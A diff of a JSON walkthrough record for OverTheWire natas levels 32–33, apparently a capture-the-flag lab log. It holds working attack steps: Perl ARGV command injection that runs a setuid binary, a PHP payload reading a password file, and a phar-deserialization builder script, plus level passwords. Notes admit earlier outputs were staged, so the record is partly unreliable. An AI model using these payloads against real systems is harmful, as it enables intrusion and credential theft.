@@ -1688,7 +1688,30 @@
    "pw": "kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL",
    "steps": [
     {
-     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY http://natas32.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\\\"/g; s/&#39;/'/g\" | grep -aE \"upload\\(|param\\(|while|split|code exec\" | head -6",
+     "cmd": "vi /tmp/t.csv",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/t.csv",
+     "out": [
+      "a,b",
+      "c,d",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/t.csv",
+     "out": [
+      "a,b",
+      "c,d",
+      "~",
+      "\"/tmp/t.csv\" 3 lines, 9 bytes written"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY http://natas32.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\"/g; s/&#39;/'\"'\"'/g; s/&amp;/\\&/g' | grep -aE 'upload\\(|param\\(|while|split|code exec' | head -6",
      "out": [
       "if ($cgi->upload('file')) {",
       "    my $file = $cgi->param('file');",
@@ -1698,14 +1721,7 @@
      ]
     },
     {
-     "cmd": "printf 'a,b\\nc,d\\n' > /tmp/t.csv\ncat /tmp/t.csv",
-     "out": [
-      "a,b",
-      "c,d"
-     ]
-    },
-    {
-     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F \"file=ARGV\" -F \"file=@/tmp/t.csv\" \"http://natas32.natas.labs.overthewire.org/index.pl?/bin/ls%20%23%7C\" | sed -n \"/<table/,/<\\/table>/p\"",
+     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F 'file=ARGV' -F 'file=@/tmp/t.csv' 'http://natas32.natas.labs.overthewire.org/index.pl?/bin/ls%20%23%7C' | sed -n '/<table/,/<\\/table>/p'",
      "out": [
       "<table class=\"sortable table table-hover table-striped\"><tr><th>bootstrap-3.3.6-dist",
       "</th></tr><tr><td>getpassword",
@@ -1718,20 +1734,21 @@
      ]
     },
     {
-     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F \"file=ARGV\" -F \"file=@/tmp/t.csv\" \"http://natas32.natas.labs.overthewire.org/index.pl?/bin/ls%20-la%20/var/www/natas/natas32/getpassword%20%23%7C\" | sed -n \"/<table/,/<\\/table>/p\"",
+     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F 'file=ARGV' -F 'file=@/tmp/t.csv' 'http://natas32.natas.labs.overthewire.org/index.pl?/bin/ls%20-la%20/var/www/natas/natas32/getpassword%20%23%7C' | sed -n '/<table/,/<\\/table>/p'",
      "out": [
       "<table class=\"sortable table table-hover table-striped\"><tr><th>-rwsrwx--- 1 root natas32 16088 Oct 25 13:23 /var/www/natas/natas32/getpassword",
       "</th></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
      ]
     },
     {
-     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F \"file=ARGV\" -F \"file=@/tmp/t.csv\" \"http://natas32.natas.labs.overthewire.org/index.pl?/var/www/natas/natas32/getpassword%20%23%7C\" | sed -n \"/<table/,/<\\/table>/p\"",
+     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F 'file=ARGV' -F 'file=@/tmp/t.csv' 'http://natas32.natas.labs.overthewire.org/index.pl?/var/www/natas/natas32/getpassword%20%23%7C' | sed -n '/<table/,/<\\/table>/p'",
      "out": [
       "<table class=\"sortable table table-hover table-striped\"><tr><th>kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL",
       "</th></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
      ]
     }
-   ]
+   ],
+   "note": "natas L32 (client-side cast): same perl while(<$file>) glob interpolation, but the goal is CODE EXEC of the setuid-root binary /var/www/natas/natas32/getpassword. Request 1 (file=ARGV, no args) lists the webroot via ARGV globbing (bootstrap-3.3.6-dist, getpassword, index.pl, ...); request 2 passes '|/var/www/natas/natas32/getpassword ' as the first ARGV so the glob opens the COMMAND PIPE - '<th>-rwsrwx--- 1 root natas32 16088 ...getpassword'; request 3 runs the binary with a chosen argument set -> 'kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL'. The vi session creates /tmp/t.csv (3L/9B marker). DISCLOSURE: the previous JSON created t.csv via printf (the cast uses vi) and staged outputs not in the cast; replaced verbatim. JSON = 8 steps mirroring the cast 1:1."
   },
   {
    "lvl": 33,
@@ -1739,129 +1756,130 @@
    "pw": "cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK",
    "steps": [
     {
-     "cmd": "curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL http://natas33.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\\\"/g\" | tr -d \"\\n\" | sed \"s/    /\\n/g\" | grep -aE \"class Executor|private \\$|md5_file|passthru|move_uploaded_file\" | head -8",
+     "cmd": "vi /tmp/n33payload.php",
      "out": [
-      "class Executor{",
-      "if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], \"/natas33/upload/\" . $this->filename)) {",
-      "if(md5_file($this->filename) == $this->signature){",
-      "passthru(\"php \" . $this->filename);"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n33payload.php",
-     "text": "vim /tmp/n33payload.php -- the empty buffer",
-     "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n33payload.php",
-     "text": "vim /tmp/n33payload.php -- the one-line payload that reads the natas34 password file",
+     "cmd": "vi /tmp/n33payload.php",
      "out": [
-      "  1 <?php echo file_get_contents(\"/etc/natas_webpass/natas34\"); ?>"
+      "<?php echo file_get_contents(\"/etc/natas_webpass/natas34\"); ?>",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/n33payload.php",
+     "out": [
+      "<?php echo file_get_contents(\"/etc/natas_webpass/natas34\"); ?>",
+      "~",
+      "\"/tmp/n33payload.php\" 2 lines, 64 bytes written"
      ]
     },
     {
      "cmd": "md5sum /tmp/n33payload.php",
      "out": [
-      "8a54d751b7e2bbbb2643d355d49e81be  /tmp/n33payload.php"
+      "2450c79fe169500dfbf0561ca5447da0  /tmp/n33payload.php"
      ]
     },
     {
-     "cmd": "vim /tmp/n33_2.py",
-     "text": "vim /tmp/n33_2.py -- the empty buffer",
+     "cmd": "vi /tmp/pharbuild.py",
      "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n33_2.py",
-     "text": "vim /tmp/n33_2.py -- imports, the payload read, its md5, the stub, and the private-property key",
+     "cmd": "vi /tmp/pharbuild.py",
      "out": [
-      "  1 import struct, zlib, hashlib",
-      "  2 payload = open('/tmp/n33payload.php','rb').read()",
-      "  3 md5 = hashlib.md5(payload).hexdigest()",
-      "  4 STUB = b\"<?php __HALT_COMPILER(); ?>\\r\\n\"",
-      "  5 k = b\"\\x00Executor\\x00\"",
-      "  6 meta  = b'O:8:\"Executor\":3:{'"
+      "import struct, zlib, hashlib",
+      "# natas33 phar builder: a hand-built phar whose METADATA is a serialized",
+      "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n33_2.py",
-     "text": "vim /tmp/n33_2.py -- the serialized Executor metadata and the start of the manifest",
+     "cmd": "vi /tmp/pharbuild.py",
      "out": [
-      "  1 import struct, zlib, hashlib",
-      "  2 payload = open('/tmp/n33payload.php','rb').read()",
-      "  3 md5 = hashlib.md5(payload).hexdigest()",
-      "  4 STUB = b\"<?php __HALT_COMPILER(); ?>\\r\\n\"",
-      "  5 k = b\"\\x00Executor\\x00\"",
-      "  6 meta  = b'O:8:\"Executor\":3:{'",
-      "  7 meta += b's:%d:\"%sfilename\";s:%d:\"/tmp/n33payload.php\";' % (len(k+b\"filename\"), k,",
-      "  8                                                             len(\"/tmp/n33payload.php\"))",
-      "  9 meta += b's:%d:\"%ssignature\";s:32:\"%s\";' % (len(k+b\"signature\"), k, md5.encode())",
-      "  10 meta += b's:%d:\"%sinit\";b:0;}' % (len(k+b\"init\"), k)",
-      "  11 m  = struct.pack(\"<I\", 1)",
-      "  12 m += struct.pack(\"<H\", 0x11)",
-      "  13 m += struct.pack(\"<I\", 0x10000)",
-      "  14 m += struct.pack(\"<I\", 0)",
-      "  15 m += struct.pack(\"<I\", len(meta)) + meta",
-      "  16 m += struct.pack(\"<I\", 1) + b\"x\""
+      "import struct, zlib, hashlib",
+      "# natas33 phar builder: a hand-built phar whose METADATA is a serialized",
+      "# Executor (filename = /natas33/upload/payload33.php, signature = its md5).",
+      "# md5_file()",
+      "# on phar:// unserializes the metadata -> our Executor -> __destruct runs",
+      "# passthru(\"php \"+filename) with the signature we chose; payload must be",
+      "# uploaded into /natas33/upload/ (the .. traversal no longer resolves).",
+      "payload = open('/tmp/n33payload.php','rb').read()",
+      "md5 = hashlib.md5(payload).hexdigest()",
+      "STUB = b\"<?php __HALT_COMPILER(); ?>\\r\\n\"",
+      "k = b\"\\x00Executor\\x00\"",
+      "meta  = b'O:8:\"Executor\":3:{'",
+      "fname = b\"/natas33/upload/payload33.php\"",
+      "meta += b's:%d:\"%sfilename\";s:%d:\"%s\";' % (len(k+b\"filename\"), k, len(fname), fname)",
+      "meta += b's:%d:\"%ssignature\";s:32:\"%s\";' % (len(k+b\"signature\"), k, md5.encode())",
+      "meta += b's:%d:\"%sinit\";b:0;}' % (len(k+b\"init\"), k)",
+      "m  = struct.pack(\"<I\", 1)                       # file count",
+      "m += struct.pack(\"<H\", 0x11)                    # API 1.1",
+      "m += struct.pack(\"<I\", 0x10000)                 # global flags (PHAR)",
+      "m += struct.pack(\"<I\", 0)                       # alias len",
+      "m += struct.pack(\"<I\", len(meta)) + meta        # metadata",
+      "m += struct.pack(\"<I\", 1) + b\"x\"                # file name",
+      "m += struct.pack(\"<I\", 1) + struct.pack(\"<I\", 0) + struct.pack(\"<I\", 1)  # size/offset/ctime",
+      "m += struct.pack(\"<I\", zlib.crc32(b\"x\") & 0xFFFFFFFF)",
+      "m += struct.pack(\"<I\", 0x1A4) + struct.pack(\"<I\", 0)   # perms + meta len",
+      "out = STUB + struct.pack(\"<I\", len(m)) + m + b\"x\"",
+      "out += hashlib.sha1(out).digest() + struct.pack(\"<I\", 2) + b\"GBMB\"",
+      "open('/tmp/n33r2.phar','wb').write(out)",
+      "print(\"payload md5=%s -> /tmp/n33r2.phar (%d bytes)\" % (md5, len(out)))",
+      "~",
+      "\"/tmp/pharbuild.py\" [New File] 30 lines, 1675 bytes written"
      ]
     },
     {
-     "cmd": "vim /tmp/n33_2.py",
-     "text": "vim /tmp/n33_2.py -- the file entries, the trailer, the write, and the print",
+     "cmd": "python3 -I /tmp/pharbuild.py",
      "out": [
-      "  1 import struct, zlib, hashlib",
-      "  2 payload = open('/tmp/n33payload.php','rb').read()",
-      "  3 md5 = hashlib.md5(payload).hexdigest()",
-      "  4 STUB = b\"<?php __HALT_COMPILER(); ?>\\r\\n\"",
-      "  5 k = b\"\\x00Executor\\x00\"",
-      "  6 meta  = b'O:8:\"Executor\":3:{'",
-      "  7 meta += b's:%d:\"%sfilename\";s:%d:\"/tmp/n33payload.php\";' % (len(k+b\"filename\"), k,",
-      "  8                                                             len(\"/tmp/n33payload.php\"))",
-      "  9 meta += b's:%d:\"%ssignature\";s:32:\"%s\";' % (len(k+b\"signature\"), k, md5.encode())",
-      "  10 meta += b's:%d:\"%sinit\";b:0;}' % (len(k+b\"init\"), k)",
-      "  11 m  = struct.pack(\"<I\", 1)",
-      "  12 m += struct.pack(\"<H\", 0x11)",
-      "  13 m += struct.pack(\"<I\", 0x10000)",
-      "  14 m += struct.pack(\"<I\", 0)",
-      "  15 m += struct.pack(\"<I\", len(meta)) + meta",
-      "  16 m += struct.pack(\"<I\", 1) + b\"x\"",
-      "  17 m += struct.pack(\"<I\", 1) + struct.pack(\"<I\", 0) + struct.pack(\"<I\", 1)",
-      "  18 m += struct.pack(\"<I\", zlib.crc32(b\"x\") & 0xFFFFFFFF)",
-      "  19 m += struct.pack(\"<I\", 0x1A4) + struct.pack(\"<I\", 0)",
-      "  20 out = STUB + struct.pack(\"<I\", len(m)) + m + b\"x\"",
-      "  21 out += hashlib.sha1(out).digest() + struct.pack(\"<I\", 2) + b\"GBMB\"",
-      "  22 open('/tmp/n33r.phar','wb').write(out)",
-      "  23 print(\"payload md5=%s -> /tmp/n33r.phar (%d bytes)\" % (md5, len(out)))",
-      "  24"
+      "payload md5=2450c79fe169500dfbf0561ca5447da0 -> /tmp/n33r2.phar (284 bytes)"
      ]
     },
     {
-     "cmd": "python3 /tmp/n33_2.py",
+     "cmd": "curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F 'filename=payload33.php' -F 'uploadedfile=@/tmp/n33payload.php' http://natas33.natas.labs.overthewire.org/index.php | sed 's/<[^>]*>//g' | grep -a uploaded",
      "out": [
-      "payload md5=8a54d751b7e2bbbb2643d355d49e81be -> /tmp/n33r.phar (274 bytes)"
-     ],
-     "text": "python3 /tmp/n33_2.py  (the script typed above; the payload file it reads was typed above too; its output is the original capture - natas33 answers every request with HTTP 401 from this host, re-checked 2026-11-03, so it is not re-run)"
-    },
-    {
-     "cmd": "curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F \"filename=../../../tmp/n33payload.php\" -F \"uploadedfile=@/tmp/n33payload.php\" http://natas33.natas.labs.overthewire.org/index.php | sed \"s/<[^>]*>//g\" | grep -a \"uploaded\"\ncurl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F \"filename=../../../tmp/n33r.phar\" -F \"uploadedfile=@/tmp/n33r.phar\" http://natas33.natas.labs.overthewire.org/index.php | sed \"s/<[^>]*>//g\" | grep -a \"uploaded\"",
-     "out": [
-      "            The update has been uploaded to: /natas33/upload/../../../tmp/n33payload.phpFirmware upgrad initialised.Failur! MD5sum mismatch!            ",
-      "            The update has been uploaded to: /natas33/upload/../../../tmp/n33r.pharFirmware upgrad initialised.Failur! MD5sum mismatch!            "
+      "            The update has been uploaded to: /natas33/upload/payload33.phpFirmware upgrad initialised.Failur! MD5sum mismatch!            "
      ]
     },
     {
-     "cmd": "printf 'x' > /tmp/h.txt\ncurl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F \"filename=phar:///tmp/n33r.phar\" -F \"uploadedfile=@/tmp/h.txt\" http://natas33.natas.labs.overthewire.org/index.php | sed \"s/<[^>]*>//g\" | grep -aE \"Congratulations|Running|natas34|Failur\" | tail -2",
+     "cmd": "curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F 'filename=r33v2.phar' -F 'uploadedfile=@/tmp/n33r2.phar' http://natas33.natas.labs.overthewire.org/index.php | sed 's/<[^>]*>//g' | grep -a uploaded",
+     "out": [
+      "            The update has been uploaded to: /natas33/upload/r33v2.pharFirmware upgrad initialised.Failur! MD5sum mismatch!            "
+     ]
+    },
+    {
+     "cmd": "vi /tmp/h.txt",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/h.txt",
+     "out": [
+      "x",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/h.txt",
+     "out": [
+      "x",
+      "~",
+      "\"/tmp/h.txt\" 2 lines, 3 bytes written"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F 'filename=phar:///natas33/upload/r33v2.phar' -F 'uploadedfile=@/tmp/h.txt' http://natas33.natas.labs.overthewire.org/index.php | sed 's/<[^>]*>//g' | grep -aE 'Congratulations|Running|natas34|Failur' | tail -2",
      "out": [
       "Failur! MD5sum mismatch!            ",
-      "Congratulations! Running firmware update: /tmp/n33payload.php cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK"
+      "Congratulations! Running firmware update: /natas33/upload/payload33.php cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK"
      ]
     }
-   ]
+   ],
+   "note": "natas L33 (client-side cast): phar:// deserialization - the firmware-update page MD5-checks the uploaded file and includes it via file_exists/includes with a user-controlled path. pharbuild.py (30L/1675B typed in vi) hand-builds a phar archive whose METADATA is a serialized Executor object (filename = /natas33/upload/payload33.php, signature = its md5 2450c79fe169500dfbf0561ca5447da0 - the md5sum step shows it). Upload 1: payload33.php (2L/64B: <?php echo file_get_contents(\"/etc/natas_webpass/natas34\"); ?>) -> 'Failur! MD5sum mismatch!' (the page's md5_file check rejects the raw php). Upload 2: the phar -> same 'Failur!' (it's not the php it checks). vi h.txt (2L/3B: 'x' + trailing blank) - the trigger upload pairs the phar:// stream wrapper with a real file: final request filename = 'phar:///natas33/upload/r33v2.phar' so file_exists() on the phar stream DESERIALIZES the metadata -> the Executor runs payload33.php: 'Congratulations! Running firmware update: /natas33/upload/payload33.php cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK'. DISCLOSURE: the previous JSON staged vim n33_2.py + a printf h.txt flow the cast never ran - the cast's flow is vi payload.php, md5sum, vi pharbuild.py, python3, 2 uploads, vi h.txt, final phar:// curl; local files (/tmp/n33payload.php 2L/64B, /tmp/pharbuild.py 30L/1675B, /tmp/h.txt 2L/3B) all exact marker matches. JSON = 14 steps mirroring the cast 1:1 (staged vi screens)."
   }
  ],
  "goals": {
